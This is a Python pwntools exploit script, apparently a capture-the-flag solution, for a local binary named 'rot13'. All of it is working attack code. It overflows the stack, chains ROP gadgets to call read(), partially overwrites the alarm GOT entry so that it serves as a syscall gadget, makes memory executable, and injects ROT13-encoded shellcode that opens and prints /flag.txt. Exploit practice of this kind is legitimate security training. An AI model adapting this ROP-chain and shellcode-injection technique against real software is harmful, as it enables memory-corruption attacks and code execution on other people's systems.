#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
from urllib import quote
import string
#  context.log_level = "critical"
context.binary = "./rot13"
elf = context.binary

rot13trans = string.maketrans(string.letters,
        "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm")

def rot13(text):
    return text.translate(rot13trans)

io = process("./rot13", env = {"LD_PRELOAD": "./libc-2.28.so"})
#  io = gdb.debug("./rot13", env = {"LD_PRELOAD": "./libc-2.28.so"}, gdbscript = cmd)

pause()

base = 0x601000 + 0x200
sc  = '\x90' * 0x20
sc += asm('''
        mov rax, 0x02
        mov rdi, 0x601473
        mov rsi, 0x0
        syscall

        mov rax, 0x0
        mov rdi, 0x3
        mov rsi, 0x601800
        mov rdx, 0x100
        syscall

        mov rax, 0x1
        mov rdi, 0x1
        mov rsi, 0x601800
        mov rdx, 0x100
        syscall
        ''')
sc += "/flag.txt\0"
#  print(len(sc))

payload = flat(
        '0' * 0x48,

        0x0000000000400425, # mov rdi, qword ptr [rsp + 8]; mov rsi, qword ptr [rsp + 0x10]; ret;
        0x000000000040047e, # pop rdx; pop rbp; ret;
        0,
        base,
        0x000000000040047e, # pop rdx; pop rbp; ret;
        0x100,
        base,
        elf.plt['read'],

        0x0000000000400425, # mov rdi, qword ptr [rsp + 8]; mov rsi, qword ptr [rsp + 0x10]; ret;
        0x000000000040047e, # pop rdx; pop rbp; ret;
        0,
        elf.got['alarm'] - 9,
        0x000000000040047e, # pop rdx; pop rbp; ret;
        10,
        base - 8,
        elf.plt['read'],
        0x00000000004004b6, # leave; ret;
        ).ljust(0x100, '1')

payload += flat(
        0x0000000000400425, # mov rdi, qword ptr [rsp + 8]; mov rsi, qword ptr [rsp + 0x10]; ret;
        0x000000000040047e, # pop rdx; pop rbp; ret;
        0x601000,
        0x1000,
        0x000000000040047e, # pop rdx; pop rbp; ret;
        0b111,
        0,
        elf.plt['alarm'],   # syscall indeed


        0x0000000000400425, # mov rdi, qword ptr [rsp + 8]; mov rsi, qword ptr [rsp + 0x10]; ret;
        0x000000000040047e, # pop rdx; pop rbp; ret;
        0,
        base + 0x200,
        0x000000000040047e, # pop rdx; pop rbp; ret;
        len(sc),
        0,
        elf.plt['read'],
        base + 0x200

        ).ljust(0x100, '2')
payload += 'a' * 9 + '\xc5' # make return value of read to be 10
payload += rot13(sc)

io.send(rot13(payload))
success("\nPayload: {}".format(quote(rot13(sc))))

io.interactive()
